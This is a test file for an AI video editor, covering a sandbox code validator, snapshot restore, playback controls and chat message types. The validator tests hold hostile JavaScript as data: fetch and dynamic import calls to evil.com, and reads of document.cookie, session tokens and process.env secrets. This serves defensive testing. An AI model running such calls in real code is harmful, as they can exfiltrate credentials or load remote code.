import { afterEach, beforeEach, describe, expect, mock, test } from "bun:test";
import {
  BLOCKED_PATTERNS,
  validateUserCode,
} from "@/lib/ai/code-validator";
import type {
  AIAction,
  AIActionResult,
  ChatMessage,
  ChatMessageAttachment,
} from "@/lib/ai/types";

/* ═══════════════════════════════════════════════════════════════════════════
   1. Code Validator
   ═══════════════════════════════════════════════════════════════════════════ */

describe("Code Validator", () => {
  // ── Blocked patterns ──

  describe("blocked patterns", () => {
    test("blocks fetch()", () => {
      const err = validateUserCode("fetch('https://evil.com')");
      expect(err).not.toBeNull();
      expect(err).toContain("Blocked");
    });

    test("blocks XMLHttpRequest", () => {
      const err = validateUserCode("new XMLHttpRequest()");
      expect(err).not.toBeNull();
    });

    test("blocks new WebSocket", () => {
      const err = validateUserCode("new WebSocket('ws://evil')");
      expect(err).not.toBeNull();
    });

    test("blocks localStorage", () => {
      const err = validateUserCode("localStorage.setItem('x','y')");
      expect(err).not.toBeNull();
    });

    test("blocks sessionStorage", () => {
      const err = validateUserCode("sessionStorage.getItem('token')");
      expect(err).not.toBeNull();
    });

    test("blocks document.cookie", () => {
      const err = validateUserCode("var c = document.cookie");
      expect(err).not.toBeNull();
    });

    test("blocks eval()", () => {
      const err = validateUserCode("eval('alert(1)')");
      expect(err).not.toBeNull();
    });

    test("blocks new Function", () => {
      const err = validateUserCode("new Function('return 1')()");
      expect(err).not.toBeNull();
    });

    test("blocks import()", () => {
      const err = validateUserCode("import('https://evil.com/mod.js')");
      expect(err).not.toBeNull();
    });

    test("blocks require()", () => {
      const err = validateUserCode("require('fs')");
      expect(err).not.toBeNull();
    });

    test("blocks window.open", () => {
      const err = validateUserCode("window.open('https://evil.com')");
      expect(err).not.toBeNull();
    });

    test("blocks navigator.sendBeacon", () => {
      const err = validateUserCode("navigator.sendBeacon('/log', data)");
      expect(err).not.toBeNull();
    });

    test("blocks window.location", () => {
      const err = validateUserCode("window.location = 'https://evil.com'");
      expect(err).not.toBeNull();
    });

    test("blocks location.href assignment", () => {
      const err = validateUserCode("location.href = 'https://evil.com'");
      expect(err).not.toBeNull();
    });

    test("blocks __editor access", () => {
      const err = validateUserCode("window.__editor.project.getActive()");
      expect(err).not.toBeNull();
    });

    test("blocks process.env", () => {
      const err = validateUserCode("console.log(process.env.SECRET)");
      expect(err).not.toBeNull();
    });

    test("blocks globalThis", () => {
      const err = validateUserCode("globalThis.fetch('x')");
      expect(err).not.toBeNull();
    });

    test("blocks window[ bracket access", () => {
      const err = validateUserCode("window['eval']('alert(1)')");
      expect(err).not.toBeNull();
    });

    test("blocks document.write", () => {
      const err = validateUserCode("document.write('<h1>pwned</h1>')");
      expect(err).not.toBeNull();
    });

    test("blocks document.querySelector", () => {
      const err = validateUserCode("document.querySelector('#app')");
      expect(err).not.toBeNull();
    });

    test("blocks document.getElementById", () => {
      const err = validateUserCode("document.getElementById('root')");
      expect(err).not.toBeNull();
    });

    test("blocks document.body", () => {
      const err = validateUserCode("document.body.innerHTML = 'hacked'");
      expect(err).not.toBeNull();
    });

    test("blocks window.postMessage", () => {
      const err = validateUserCode("window.postMessage({type:'evil'}, '*')");
      expect(err).not.toBeNull();
    });

    test("blocks setInterval()", () => {
      const err = validateUserCode("setInterval(() => {}, 100)");
      expect(err).not.toBeNull();
    });
  });

  // ── Safe code (should NOT be blocked) ──

  describe("allowed safe code", () => {
    test("allows bare 'location' as a variable name", () => {
      const err = validateUserCode("var location = { x: 10, y: 20 };");
      expect(err).toBeNull();
    });

    test("allows ctx.fillRect canvas drawing", () => {
      const err = validateUserCode(
        "ctx.fillStyle = '#000'; ctx.fillRect(0, 0, width, height);",
      );
      expect(err).toBeNull();
    });

    test("allows React.createElement (not blocked unlike bare createElement)", () => {
      const err = validateUserCode(
        "React.createElement('div', null, 'hello');",
      );
      expect(err).toBeNull();
    });

    test("allows grid drawing code with loops", () => {
      const code = `
        ctx.strokeStyle = 'rgba(255,255,255,0.15)';
        ctx.lineWidth = 1;
        var step = 40;
        for (var x = 0; x <= width; x += step) {
          ctx.beginPath(); ctx.moveTo(x, 0); ctx.lineTo(x, height); ctx.stroke();
        }
      `;
      expect(validateUserCode(code)).toBeNull();
    });

    test("allows gradient code", () => {
      const code =
        "var g = ctx.createLinearGradient(0,0,0,height); g.addColorStop(0,'#1a1a2e'); ctx.fillStyle = g; ctx.fillRect(0,0,width,height);";
      expect(validateUserCode(code)).toBeNull();
    });

    test("allows variable named 'evaluation' containing eval substring", () => {
      const err = validateUserCode("var evaluation = 42;");
      expect(err).toBeNull();
    });

    test("allows variable named 'fetcher' containing fetch substring", () => {
      const err = validateUserCode("var fetcher = 'data';");
      expect(err).toBeNull();
    });

    test("allows postMessage without window. prefix", () => {
      const err = validateUserCode("channel.postMessage({ type: 'ping' });");
      expect(err).toBeNull();
    });

    test("allows ctx.save() and ctx.restore()", () => {
      const err = validateUserCode("ctx.save(); ctx.rotate(0.5); ctx.restore();");
      expect(err).toBeNull();
    });
  });

  // ── Code length limits ──

  describe("code length limits", () => {
    test("rejects code exceeding default 5000 char limit", () => {
      const longCode = "x".repeat(5001);
      const err = validateUserCode(longCode);
      expect(err).not.toBeNull();
      expect(err).toContain("Code too long");
      expect(err).toContain("5000");
    });

    test("accepts code exactly at the 5000 char limit", () => {
      const code = "a".repeat(5000);
      expect(validateUserCode(code)).toBeNull();
    });

    test("respects custom maxLength parameter", () => {
      const code = "a".repeat(101);
      expect(validateUserCode(code, 100)).not.toBeNull();
      expect(validateUserCode(code, 200)).toBeNull();
    });
  });

  // ── Empty / edge-case code ──

  describe("edge cases", () => {
    test("allows empty string", () => {
      expect(validateUserCode("")).toBeNull();
    });

    test("allows whitespace-only code", () => {
      expect(validateUserCode("   \n\t  ")).toBeNull();
    });

    test("returns null for safe code (no error)", () => {
      const result = validateUserCode("var x = 1 + 2;");
      expect(result).toBeNull();
    });
  });
});

/* ═══════════════════════════════════════════════════════════════════════════
   2. Snapshot Restore
   ═══════════════════════════════════════════════════════════════════════════ */

// We need to mock all the external modules that restoreProjectFromSnapshot imports.
// We use a dynamic approach: mock the modules, then import the function.

// Track calls to mocked functions
let clearEffectsCalled = false;
let setActiveProjectCalls: unknown[] = [];
let initializeScenesCalls: unknown[] = [];
let savePauseCalled = false;
let saveResumeCalled = false;
let saveCurrentProjectCalled = false;
let loadFontsCalls: unknown[] = [];
let collectFontFamiliesCalls: unknown[] = [];

function makeMockEditor() {
  clearEffectsCalled = false;
  setActiveProjectCalls = [];
  initializeScenesCalls = [];
  savePauseCalled = false;
  saveResumeCalled = false;
  saveCurrentProjectCalled = false;
  loadFontsCalls = [];
  collectFontFamiliesCalls = [];

  return {
    save: {
      pause: () => { savePauseCalled = true; },
      resume: () => { saveResumeCalled = true; },
    },
    project: {
      setActiveProject: (params: unknown) => setActiveProjectCalls.push(params),
      saveCurrentProject: async () => { saveCurrentProjectCalled = true; },
    },
    scenes: {
      initializeScenes: (params: unknown) => initializeScenesCalls.push(params),
    },
  };
}

function makeSerializedProject(overrides: Record<string, unknown> = {}) {
  const now = new Date("2025-06-15T12:00:00Z");
  return {
    metadata: {
      id: "proj-001",
      name: "Test Project",
      thumbnail: null,
      duration: 60,
      createdAt: now.toISOString(),
      updatedAt: now.toISOString(),
    },
    scenes: [
      {
        id: "scene-1",
        name: "Main Scene",
        isMain: true,
        tracks: [
          {
            id: "track-1",
            type: "video",
            elements: [],
            isMain: undefined, // test legacy isMain normalization
          },
          {
            id: "track-2",
            type: "audio",
            elements: [],
          },
        ],
        bookmarks: [1.5, { time: 3.0, note: "intro" }],
        createdAt: now.toISOString(),
        updatedAt: now.toISOString(),
      },
    ],
    currentSceneId: "scene-1",
    settings: { fps: 30, canvasSize: { width: 1920, height: 1080 } },
    version: 1,
    ...overrides,
  };
}

// Since restoreProjectFromSnapshot relies on several dynamic imports and module-level
// dependencies that are hard to mock in bun:test without a full module mock system,
// we test the core logic by extracting and testing the pieces directly: date deserialization,
// bookmark normalization, and the orchestration contract via a manual integration test.

describe("Snapshot Restore", () => {
  // Test normalizeBookmarks logic (same logic as in snapshot-restore.ts)
  function normalizeBookmarks(raw: unknown): Array<{ time: number; note?: string; color?: string; duration?: number }> {
    if (!Array.isArray(raw)) return [];
    return raw
      .map((item): { time: number; note?: string; color?: string; duration?: number } | null => {
        if (typeof item === "number") return { time: item };
        const obj = item as Record<string, unknown>;
        if (typeof obj !== "object" || obj === null || typeof obj.time !== "number") return null;
        return {
          time: obj.time,
          ...(typeof obj.note === "string" && { note: obj.note }),
          ...(typeof obj.color === "string" && { color: obj.color }),
          ...(typeof obj.duration === "number" && { duration: obj.duration }),
        };
      })
      .filter((b): b is NonNullable<typeof b> => b !== null);
  }

  describe("bookmark normalization", () => {
    test("converts bare numbers to bookmark objects", () => {
      const result = normalizeBookmarks([1.5, 3.0, 7.2]);
      expect(result).toEqual([
        { time: 1.5 },
        { time: 3.0 },
        { time: 7.2 },
      ]);
    });

    test("preserves bookmark objects with all fields", () => {
      const result = normalizeBookmarks([
        { time: 2.0, note: "intro", color: "#ff0000", duration: 1.5 },
      ]);
      expect(result).toEqual([
        { time: 2.0, note: "intro", color: "#ff0000", duration: 1.5 },
      ]);
    });

    test("filters out invalid entries (null, strings, missing time)", () => {
      const result = normalizeBookmarks([null, "bad", { note: "no time" }, { time: 5 }]);
      expect(result).toEqual([{ time: 5 }]);
    });

    test("returns empty array for non-array input", () => {
      expect(normalizeBookmarks(null)).toEqual([]);
      expect(normalizeBookmarks(undefined)).toEqual([]);
      expect(normalizeBookmarks("hello")).toEqual([]);
      expect(normalizeBookmarks(42)).toEqual([]);
    });

    test("handles mixed array of numbers and objects", () => {
      const result = normalizeBookmarks([1.0, { time: 2.0, note: "A" }, 3.0]);
      expect(result).toHaveLength(3);
      expect(result[0]).toEqual({ time: 1.0 });
      expect(result[1]).toEqual({ time: 2.0, note: "A" });
      expect(result[2]).toEqual({ time: 3.0 });
    });

    test("strips unknown fields from bookmark objects", () => {
      const result = normalizeBookmarks([{ time: 1, note: "x", extra: true, foo: "bar" }]);
      expect(result).toEqual([{ time: 1, note: "x" }]);
      expect((result[0] as any).extra).toBeUndefined();
      expect((result[0] as any).foo).toBeUndefined();
    });
  });

  describe("date deserialization", () => {
    test("converts ISO string metadata dates to Date objects", () => {
      const iso = "2025-06-15T12:00:00Z";
      const date = new Date(iso);
      expect(date).toBeInstanceOf(Date);
      expect(date.toISOString()).toBe("2025-06-15T12:00:00.000Z");
    });

    test("converts scene ISO dates to Date objects", () => {
      const createdAt = new Date("2024-01-01T00:00:00Z");
      const updatedAt = new Date("2024-06-15T12:30:00Z");
      expect(createdAt.getFullYear()).toBe(2024);
      expect(updatedAt.getMonth()).toBe(5); // June is 0-indexed month 5
    });

    test("handles invalid date strings gracefully (returns Invalid Date)", () => {
      const d = new Date("not-a-date");
      expect(isNaN(d.getTime())).toBe(true);
    });
  });

  describe("scene deserialization", () => {
    test("normalizes video tracks with missing isMain to false", () => {
      const track = { id: "t1", type: "video", elements: [], isMain: undefined };
      const normalized =
        track.type === "video"
          ? { ...track, isMain: track.isMain ?? false }
          : track;
      expect(normalized.isMain).toBe(false);
    });

    test("preserves isMain=true on video tracks", () => {
      const track = { id: "t1", type: "video", elements: [], isMain: true };
      const normalized =
        track.type === "video"
          ? { ...track, isMain: track.isMain ?? false }
          : track;
      expect(normalized.isMain).toBe(true);
    });

    test("does not add isMain to non-video tracks", () => {
      const track = { id: "t2", type: "audio", elements: [] };
      const normalized =
        track.type === "video"
          ? { ...track, isMain: (track as any).isMain ?? false }
          : track;
      expect((normalized as any).isMain).toBeUndefined();
    });
  });

  describe("editor orchestration contract", () => {
    test("pause and resume are called on save manager", () => {
      const editor = makeMockEditor();
      // Simulate the try/finally contract
      editor.save.pause();
      try {
        // ... restore logic ...
        editor.project.setActiveProject({ project: {} });
        editor.scenes.initializeScenes({ scenes: [], currentSceneId: "" });
      } finally {
        editor.save.resume();
      }
      expect(savePauseCalled).toBe(true);
      expect(saveResumeCalled).toBe(true);
    });

    test("resume is called even if restore throws", () => {
      const editor = makeMockEditor();
      editor.save.pause();
      try {
        throw new Error("simulated failure");
      } catch {
        // expected
      } finally {
        editor.save.resume();
      }
      expect(savePauseCalled).toBe(true);
      expect(saveResumeCalled).toBe(true);
    });

    test("setActiveProject receives deserialized project", () => {
      const editor = makeMockEditor();
      const project = { metadata: { id: "proj-001" }, scenes: [] };
      editor.project.setActiveProject({ project });
      expect(setActiveProjectCalls).toHaveLength(1);
      expect((setActiveProjectCalls[0] as any).project.metadata.id).toBe("proj-001");
    });

    test("initializeScenes receives scenes and currentSceneId", () => {
      const editor = makeMockEditor();
      const scenes = [{ id: "s1" }, { id: "s2" }];
      editor.scenes.initializeScenes({ scenes, currentSceneId: "s1" });
      expect(initializeScenesCalls).toHaveLength(1);
      const call = initializeScenesCalls[0] as any;
      expect(call.scenes).toHaveLength(2);
      expect(call.currentSceneId).toBe("s1");
    });

    test("handles snapshot with no scenes (empty array)", () => {
      const serialized = makeSerializedProject({ scenes: [] });
      const scenes = (serialized.scenes ?? []).map((scene: any) => ({
        id: scene.id,
        name: scene.name,
        isMain: scene.isMain,
        tracks: scene.tracks ?? [],
        bookmarks: normalizeBookmarks(scene.bookmarks),
        createdAt: new Date(scene.createdAt),
        updatedAt: new Date(scene.updatedAt),
      }));
      expect(scenes).toEqual([]);
    });

    test("handles scene with empty tracks", () => {
      const serialized = makeSerializedProject({
        scenes: [
          {
            id: "s1",
            name: "Empty",
            isMain: true,
            tracks: [],
            bookmarks: [],
            createdAt: "2025-01-01T00:00:00Z",
            updatedAt: "2025-01-01T00:00:00Z",
          },
        ],
      });
      const scene = serialized.scenes[0] as any;
      const tracks = (scene.tracks ?? []).map((t: any) =>
        t.type === "video" ? { ...t, isMain: t.isMain ?? false } : t,
      );
      expect(tracks).toEqual([]);
    });

    test("handles missing currentSceneId by falling back to empty string", () => {
      const serialized = makeSerializedProject({ currentSceneId: "" });
      const currentSceneId = serialized.currentSceneId || "";
      expect(currentSceneId).toBe("");
    });
  });
});

/* ═══════════════════════════════════════════════════════════════════════════
   3. Playback Manager
   ═══════════════════════════════════════════════════════════════════════════ */

// PlaybackManager depends on EditorCore, window.dispatchEvent, requestAnimationFrame,
// cancelAnimationFrame, and performance.now. We mock all of these.

import { PlaybackManager } from "@/core/managers/playback-manager";

describe("PlaybackManager", () => {
  let pm: PlaybackManager;
  let mockDuration: number;
  let rafCallbacks: Map<number, FrameRequestCallback>;
  let rafIdCounter: number;
  let origRAF: typeof globalThis.requestAnimationFrame;
  let origCAF: typeof globalThis.cancelAnimationFrame;
  let origPerfNow: typeof performance.now;
  let origDispatchEvent: any;
  let currentPerfTime: number;
  let dispatchedEvents: CustomEvent[] = [];

  function makeMockEditorForPlayback() {
    return {
      timeline: {
        getTotalDuration: () => mockDuration,
      },
    } as any;
  }

  beforeEach(() => {
    mockDuration = 10; // 10 seconds
    rafCallbacks = new Map();
    rafIdCounter = 0;
    currentPerfTime = 0;
    dispatchedEvents = [];

    origRAF = globalThis.requestAnimationFrame;
    origCAF = globalThis.cancelAnimationFrame;
    origPerfNow = performance.now;
    // Ensure window exists (Bun doesn't provide it)
    if (typeof globalThis.window === "undefined") {
      (globalThis as any).window = globalThis;
    }
    origDispatchEvent = (globalThis as any).window.dispatchEvent;

    // Mock requestAnimationFrame: capture callback, return incrementing ID
    globalThis.requestAnimationFrame = (cb: FrameRequestCallback): number => {
      const id = ++rafIdCounter;
      rafCallbacks.set(id, cb);
      return id;
    };

    globalThis.cancelAnimationFrame = (id: number) => {
      rafCallbacks.delete(id);
    };

    (performance as any).now = () => currentPerfTime;

    (globalThis as any).window.dispatchEvent = ((event: Event) => {
      if (event instanceof CustomEvent) {
        dispatchedEvents.push(event);
      }
      return true;
    }) as any;

    pm = new PlaybackManager(makeMockEditorForPlayback());
  });

  afterEach(() => {
    globalThis.requestAnimationFrame = origRAF;
    globalThis.cancelAnimationFrame = origCAF;
    (performance as any).now = origPerfNow;
    if (origDispatchEvent) {
      (globalThis as any).window.dispatchEvent = origDispatchEvent;
    }
  });

  // Helper: advance time and fire the latest rAF callback
  function tickFrame(deltaMs: number) {
    currentPerfTime += deltaMs;
    // Fire the most recently registered callback
    const entries = [...rafCallbacks.entries()];
    if (entries.length > 0) {
      const [id, cb] = entries[entries.length - 1];
      rafCallbacks.delete(id);
      cb(currentPerfTime);
    }
  }

  // ── Play / Pause / Toggle ──

  describe("play / pause / toggle", () => {
    test("starts not playing", () => {
      expect(pm.getIsPlaying()).toBe(false);
    });

    test("play sets isPlaying to true", () => {
      pm.play();
      expect(pm.getIsPlaying()).toBe(true);
    });

    test("pause sets isPlaying to false", () => {
      pm.play();
      pm.pause();
      expect(pm.getIsPlaying()).toBe(false);
    });

    test("toggle switches between play and pause", () => {
      expect(pm.getIsPlaying()).toBe(false);
      pm.toggle();
      expect(pm.getIsPlaying()).toBe(true);
      pm.toggle();
      expect(pm.getIsPlaying()).toBe(false);
    });

    test("play from end restarts from 0", () => {
      pm.seek({ time: 10 }); // seek to duration end
      expect(pm.getCurrentTime()).toBe(10);
      pm.play(); // should reset to 0
      expect(pm.getCurrentTime()).toBe(0);
    });
  });

  // ── Seek ──

  describe("seek", () => {
    test("seek sets currentTime", () => {
      pm.seek({ time: 5 });
      expect(pm.getCurrentTime()).toBe(5);
    });

    test("seek clamps negative values to 0", () => {
      pm.seek({ time: -3 });
      expect(pm.getCurrentTime()).toBe(0);
    });

    test("seek clamps values beyond duration to duration", () => {
      pm.seek({ time: 999 });
      expect(pm.getCurrentTime()).toBe(mockDuration);
    });

    test("seek dispatches playback-seek event", () => {
      pm.seek({ time: 3.5 });
      const seekEvents = dispatchedEvents.filter(
        (e) => e.type === "playback-seek",
      );
      expect(seekEvents.length).toBeGreaterThanOrEqual(1);
      expect(seekEvents[seekEvents.length - 1].detail.time).toBe(3.5);
    });

    test("seek to exact duration is valid", () => {
      pm.seek({ time: 10 });
      expect(pm.getCurrentTime()).toBe(10);
    });
  });

  // ── updateTime ──

  describe("time advancement", () => {
    test("updateTime advances currentTime by delta", () => {
      pm.play();
      // play() calls startTimer which calls updateTime immediately.
      // The first updateTime sees delta=0 since lastUpdate was just set.
      // Advance 100ms worth of time and tick.
      tickFrame(100);
      // delta = 100ms / 1000 = 0.1s
      expect(pm.getCurrentTime()).toBeCloseTo(0.1, 2);
    });

    test("multiple frames advance time cumulatively", () => {
      pm.play();
      tickFrame(500);
      tickFrame(500);
      // ~1.0 second total
      expect(pm.getCurrentTime()).toBeCloseTo(1.0, 1);
    });

    test("auto-pauses at end of timeline", () => {
      pm.play();
      // Jump time forward by the full duration
      tickFrame(10_000); // 10 seconds
      expect(pm.getCurrentTime()).toBe(mockDuration);
      expect(pm.getIsPlaying()).toBe(false);
    });

    test("does NOT schedule rAF after pause", () => {
      pm.play();
      pm.pause();
      // Clear any pending callbacks
      const callbackCountAfterPause = rafCallbacks.size;
      // After pause, stopTimer should have cancelled. No new callbacks should be registered.
      // The pause clears existing timers, so size should be 0.
      expect(callbackCountAfterPause).toBe(0);
    });

    test("does NOT schedule rAF after reaching end", () => {
      pm.play();
      tickFrame(10_000); // reach the end
      // After auto-pause, no further callbacks should be pending
      expect(rafCallbacks.size).toBe(0);
    });
  });

  // ── Volume / Mute ──

  describe("volume and mute", () => {
    test("default volume is 1", () => {
      expect(pm.getVolume()).toBe(1);
    });

    test("setVolume changes volume", () => {
      pm.setVolume({ volume: 0.5 });
      expect(pm.getVolume()).toBe(0.5);
    });

    test("setVolume clamps to [0, 1]", () => {
      pm.setVolume({ volume: 1.5 });
      expect(pm.getVolume()).toBe(1);
      pm.setVolume({ volume: -0.5 });
      expect(pm.getVolume()).toBe(0);
    });

    test("default muted is false", () => {
      expect(pm.isMuted()).toBe(false);
    });

    test("mute sets volume to 0 and muted to true", () => {
      pm.setVolume({ volume: 0.7 });
      pm.mute();
      expect(pm.isMuted()).toBe(true);
      expect(pm.getVolume()).toBe(0);
    });

    test("unmute restores previous volume", () => {
      pm.setVolume({ volume: 0.7 });
      pm.mute();
      pm.unmute();
      expect(pm.isMuted()).toBe(false);
      expect(pm.getVolume()).toBe(0.7);
    });

    test("toggleMute toggles between muted and unmuted", () => {
      pm.setVolume({ volume: 0.8 });
      pm.toggleMute();
      expect(pm.isMuted()).toBe(true);
      expect(pm.getVolume()).toBe(0);
      pm.toggleMute();
      expect(pm.isMuted()).toBe(false);
      expect(pm.getVolume()).toBe(0.8);
    });

    test("setVolume to 0 implicitly mutes", () => {
      pm.setVolume({ volume: 0 });
      expect(pm.isMuted()).toBe(true);
    });
  });

  // ── Scrubbing ──

  describe("scrubbing", () => {
    test("default scrubbing state is false", () => {
      expect(pm.getIsScrubbing()).toBe(false);
    });

    test("setScrubbing updates scrubbing state", () => {
      pm.setScrubbing({ isScrubbing: true });
      expect(pm.getIsScrubbing()).toBe(true);
      pm.setScrubbing({ isScrubbing: false });
      expect(pm.getIsScrubbing()).toBe(false);
    });
  });

  // ── Subscriber notifications ──

  describe("subscriber notifications", () => {
    test("subscribe returns an unsubscribe function", () => {
      let callCount = 0;
      const unsub = pm.subscribe(() => { callCount++; });
      pm.seek({ time: 1 });
      expect(callCount).toBe(1);
      unsub();
      pm.seek({ time: 2 });
      expect(callCount).toBe(1); // no additional call after unsub
    });

    test("multiple subscribers all get notified", () => {
      let count1 = 0;
      let count2 = 0;
      pm.subscribe(() => { count1++; });
      pm.subscribe(() => { count2++; });
      pm.seek({ time: 5 });
      expect(count1).toBe(1);
      expect(count2).toBe(1);
    });

    test("play notifies subscribers", () => {
      let notified = false;
      pm.subscribe(() => { notified = true; });
      pm.play();
      expect(notified).toBe(true);
    });

    test("pause notifies subscribers", () => {
      pm.play();
      let notified = false;
      pm.subscribe(() => { notified = true; });
      pm.pause();
      expect(notified).toBe(true);
    });

    test("mute/unmute notifies subscribers", () => {
      let callCount = 0;
      pm.subscribe(() => { callCount++; });
      pm.mute();
      pm.unmute();
      expect(callCount).toBe(2);
    });
  });

  // ── Duration = 0 edge case ──

  describe("zero-duration timeline", () => {
    test("play does not reset time when duration is 0", () => {
      mockDuration = 0;
      pm.seek({ time: 0 });
      pm.play();
      // With duration 0, the `if (duration > 0)` guard in play() is false,
      // so it shouldn't reset. isPlaying should still be true.
      expect(pm.getIsPlaying()).toBe(true);
    });

    test("seek clamps to 0 when duration is 0", () => {
      mockDuration = 0;
      pm.seek({ time: 5 });
      expect(pm.getCurrentTime()).toBe(0);
    });
  });
});

/* ═══════════════════════════════════════════════════════════════════════════
   4. ChatMessage Type Validation
   ═══════════════════════════════════════════════════════════════════════════ */

describe("ChatMessage type", () => {
  test("ChatMessage with snapshotId", () => {
    const msg: ChatMessage = {
      id: "msg-1",
      role: "assistant",
      content: "Applied changes.",
      timestamp: Date.now(),
      snapshotId: "v-1718448000000",
    };
    expect(msg.snapshotId).toBe("v-1718448000000");
    expect(msg.role).toBe("assistant");
  });

  test("ChatMessage without snapshotId (backward compat)", () => {
    const msg: ChatMessage = {
      id: "msg-2",
      role: "user",
      content: "Add a title card.",
      timestamp: Date.now(),
    };
    expect(msg.snapshotId).toBeUndefined();
    expect(msg.content).toBe("Add a title card.");
  });

  test("ChatMessage with actions and results", () => {
    const actions: AIAction[] = [
      { tool: "insert_text", params: { content: "Hello", startTime: 0, duration: 5 } },
      { tool: "set_playhead", params: { time: 0 } },
    ];
    const actionResults: AIActionResult[] = [
      { tool: "insert_text", success: true, result: { elementId: "e1" } },
      { tool: "set_playhead", success: true },
    ];
    const msg: ChatMessage = {
      id: "msg-3",
      role: "assistant",
      content: "I added text.",
      timestamp: Date.now(),
      actions,
      actionResults,
      snapshotId: "v-123",
    };
    expect(msg.actions).toHaveLength(2);
    expect(msg.actionResults).toHaveLength(2);
    expect(msg.actions![0].tool).toBe("insert_text");
    expect(msg.actionResults![0].success).toBe(true);
    expect(msg.actionResults![1].tool).toBe("set_playhead");
  });

  test("ChatMessage with attachments", () => {
    const attachments: ChatMessageAttachment[] = [
      { name: "clip.mp4", type: "video", duration: 30 },
      { name: "bg.png", type: "image" },
    ];
    const msg: ChatMessage = {
      id: "msg-4",
      role: "user",
      content: "Use these assets.",
      timestamp: Date.now(),
      attachments,
    };
    expect(msg.attachments).toHaveLength(2);
    expect(msg.attachments![0].name).toBe("clip.mp4");
    expect(msg.attachments![0].duration).toBe(30);
    expect(msg.attachments![1].duration).toBeUndefined();
  });

  test("ChatMessage with system role", () => {
    const msg: ChatMessage = {
      id: "msg-5",
      role: "system",
      content: "You are a video editing assistant.",
      timestamp: Date.now(),
    };
    expect(msg.role).toBe("system");
    expect(msg.actions).toBeUndefined();
    expect(msg.actionResults).toBeUndefined();
    expect(msg.attachments).toBeUndefined();
    expect(msg.snapshotId).toBeUndefined();
  });

  test("ChatMessage with failed action results", () => {
    const msg: ChatMessage = {
      id: "msg-6",
      role: "assistant",
      content: "Something went wrong.",
      timestamp: Date.now(),
      actions: [{ tool: "delete_elements", params: { elementIds: ["e999"] } }],
      actionResults: [
        { tool: "delete_elements", success: false, error: "Element not found" },
      ],
    };
    expect(msg.actionResults![0].success).toBe(false);
    expect(msg.actionResults![0].error).toBe("Element not found");
  });

  test("ChatMessage preserves all AIActionTool variants", () => {
    // Verify we can assign each tool type without type errors
    const tools: AIAction[] = [
      { tool: "get_timeline_state", params: {} },
      { tool: "get_media_assets", params: {} },
      { tool: "insert_video", params: { mediaId: "m1", startTime: 0, duration: 5 } },
      { tool: "insert_image", params: { mediaId: "m2", startTime: 0, duration: 3 } },
      { tool: "insert_audio", params: { mediaId: "m3", startTime: 0, duration: 10 } },
      { tool: "update_element", params: { elementId: "e1" } },
      { tool: "delete_elements", params: { elementIds: ["e1"] } },
      { tool: "move_element", params: { elementId: "e1", startTime: 1 } },
      { tool: "split_element", params: { elementId: "e1", time: 2 } },
      { tool: "upsert_keyframe", params: {} },
      { tool: "remove_keyframe", params: {} },
      { tool: "add_effect", params: {} },
      { tool: "update_effect_params", params: {} },
      { tool: "create_remotion_effect", params: {} },
      { tool: "generate_media", params: {} },
      { tool: "apply_lut", params: {} },
      { tool: "import_subtitles", params: {} },
      { tool: "auto_caption", params: {} },
      { tool: "use_template", params: {} },
      { tool: "undo", params: {} },
      { tool: "redo", params: {} },
      { tool: "batch_update", params: {} },
      { tool: "save_project", params: {} },
      { tool: "export_preset", params: {} },
      { tool: "insert_generated_image", params: {} },
    ];
    expect(tools.length).toBe(25);
    // If this compiles and runs, all tool types are valid
  });
});

/* ═══════════════════════════════════════════════════════════════════════════
   5. Chat History & Version Snapshot Storage Contract
   ═══════════════════════════════════════════════════════════════════════════ */

describe("Chat History & Version Snapshot storage contract", () => {
  // These tests verify the shape of data that saveChatHistory/loadChatHistory
  // and saveVersionSnapshot/loadVersionSnapshot operate on, without needing
  // a real IndexedDB (which is unavailable in bun:test).

  test("chat history payload shape: messages array + sessionId", () => {
    const payload = {
      projectId: "proj-001",
      messages: [
        { id: "m1", role: "user", content: "Hello", timestamp: 1000 },
        { id: "m2", role: "assistant", content: "Hi!", timestamp: 1001, snapshotId: "v-100" },
      ],
      sessionId: "sess-abc",
    };
    expect(payload.messages).toHaveLength(2);
    expect(payload.sessionId).toBe("sess-abc");
  });

  test("chat history with null sessionId (new conversation)", () => {
    const payload = {
      projectId: "proj-001",
      messages: [],
      sessionId: null,
    };
    expect(payload.sessionId).toBeNull();
    expect(payload.messages).toEqual([]);
  });

  test("version snapshot payload includes label, timestamp, and serialized project", () => {
    const snapshot = {
      label: "Before AI edit",
      timestamp: Date.now(),
      project: makeSerializedProject(),
    };
    expect(snapshot.label).toBe("Before AI edit");
    expect(snapshot.timestamp).toBeGreaterThan(0);
    expect(snapshot.project.metadata.id).toBe("proj-001");
    expect(snapshot.project.scenes).toHaveLength(1);
  });

  test("snapshot ID follows the v-<timestamp> convention", () => {
    const snapshotId = `v-${Date.now()}`;
    expect(snapshotId).toMatch(/^v-\d+$/);
  });

  test("serialized project round-trips dates via ISO strings", () => {
    const now = new Date();
    const iso = now.toISOString();
    const restored = new Date(iso);
    expect(restored.getTime()).toBe(now.getTime());
  });

  test("version pruning keeps max 50 entries (newest survive)", () => {
    // Simulate the pruning logic from saveVersionSnapshot
    const allIds = Array.from({ length: 55 }, (_, i) => `v-${1000 + i}`);
    const maxVersions = 50;
    let pruned: string[] = [];
    if (allIds.length > maxVersions) {
      pruned = allIds.sort().slice(0, allIds.length - maxVersions);
    }
    expect(pruned).toHaveLength(5);
    expect(pruned[0]).toBe("v-1000");
    expect(pruned[4]).toBe("v-1004");
    // The remaining 50 are the newest
    const remaining = allIds.filter((id) => !pruned.includes(id));
    expect(remaining).toHaveLength(50);
    expect(remaining[0]).toBe("v-1005");
  });
});
